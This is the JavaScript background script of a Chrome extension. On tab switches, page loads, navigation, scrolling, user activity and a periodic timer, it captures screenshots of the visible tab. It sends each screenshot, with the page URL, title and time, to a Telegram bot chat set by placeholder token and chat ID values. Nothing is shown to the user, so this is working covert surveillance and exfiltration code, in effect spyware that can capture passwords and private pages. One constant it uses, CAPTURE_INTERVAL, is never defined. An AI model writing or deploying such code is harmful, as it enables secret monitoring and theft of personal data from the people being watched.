// Configuration
const TELEGRAM_BOT_TOKEN = 'Enter_Your_Bot_Token';
const TELEGRAM_CHAT_ID = 'Enter_Your_Chat_Id';
const DEBOUNCE_DELAY = 1000; // 1 second debounce to prevent duplicate captures
const MIN_SCROLL_PIXELS = 100; // Minimum scroll to trigger capture
const MIN_MOUSE_MOVE_PIXELS = 50; // Minimum mouse movement

let lastCaptureTime = 0;
let lastScrollPosition = {};
let lastMousePosition = { x: 0, y: 0 };
let isCapturing = false;

// Initialize extension
chrome.runtime.onInstalled.addListener(() => {
  console.log('Screenshot extension installed');
  setupListeners();
});

// Set up event listeners
function setupListeners() {
  // Tab activation
  chrome.tabs.onActivated.addListener(async (activeInfo) => {
    await captureIfNeeded('tab_switch');
  });

  // Tab updates (page load)
  chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status === 'complete') {
      setTimeout(() => captureIfNeeded('page_load', tabId), 2000);
    }
  });

  // Web navigation
  chrome.webNavigation.onCompleted.addListener((details) => {
    if (details.frameId === 0) {
      setTimeout(() => captureIfNeeded('navigation', details.tabId), 2000);
    }
  });

  // Periodic capture
  setInterval(() => {
    captureIfNeeded('periodic');
  }, CAPTURE_INTERVAL);
}

// Check if we should capture
async function captureIfNeeded(trigger, specificTabId = null) {
  const now = Date.now();
  
  // Throttle captures - at least 10 seconds apart
  if (now - lastCaptureTime < 10000) {
    return;
  }

  if (isCapturing) return;
  isCapturing = true;

  try {
    const tabs = await chrome.tabs.query({ active: true, currentWindow: true });
    if (tabs.length === 0) return;

    const tab = specificTabId ? 
      await chrome.tabs.get(specificTabId) : 
      tabs[0];

    // Don't capture Chrome internal pages
    if (tab.url.startsWith('chrome://') || tab.url.startsWith('chrome-extension://')) {
      return;
    }

    console.log(`Capturing screenshot (trigger: ${trigger}) for: ${tab.url}`);
    
    // Capture screenshot
    const screenshot = await chrome.tabs.captureVisibleTab(tab.windowId, {
      format: 'jpeg',
      quality: 80
    });

    // Send to Telegram
    await sendToTelegram(screenshot, {
      url: tab.url,
      title: tab.title,
      trigger: trigger,
      timestamp: new Date().toISOString()
    });

    lastCaptureTime = now;
  } catch (error) {
    console.error('Capture error:', error);
  } finally {
    isCapturing = false;
  }
}

// Send screenshot to Telegram
async function sendToTelegram(screenshotDataUrl, metadata) {
  try {
    // Convert data URL to blob
    const response = await fetch(screenshotDataUrl);
    const blob = await response.blob();
    
    // Create form data
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', blob, 'screenshot.jpg');
    
    // Add caption with metadata
    const caption = `📸 Browser Activity\n` +
                   `📌 Page: ${metadata.title}\n` +
                   `🔗 URL: ${metadata.url}\n` +
                   `⏰ Time: ${new Date(metadata.timestamp).toLocaleString()}\n` +
                   `⚡ Trigger: ${metadata.trigger}`;
    
    formData.append('caption', caption.substring(0, 1024)); // Telegram caption limit

    // Send to Telegram
    const telegramResponse = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
      {
        method: 'POST',
        body: formData
      }
    );

    const result = await telegramResponse.json();
    if (!result.ok) {
      console.error('Telegram API error:', result);
    }
  } catch (error) {
    console.error('Telegram send error:', error);
  }
}

// Handle messages from content script
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === 'USER_ACTIVITY') {
    captureIfNeeded('user_activity', sender.tab.id);
  }
  if (message.type === 'SCROLL_CHANGE') {
    const tabId = sender.tab.id;
    const currentScroll = message.scrollTop;
    
    if (!lastScrollPosition[tabId] || 
        Math.abs(currentScroll - lastScrollPosition[tabId]) > MIN_SCROLL_PIXELS) {
      lastScrollPosition[tabId] = currentScroll;
      captureIfNeeded('scroll', tabId);
    }
  }
});

// Keep service worker alive
chrome.runtime.onStartup.addListener(() => {
  console.log('Extension starting up');
});

// Optional: Clear data periodically
setInterval(() => {
  lastScrollPosition = {};
}, 600000); // Every 10 minutes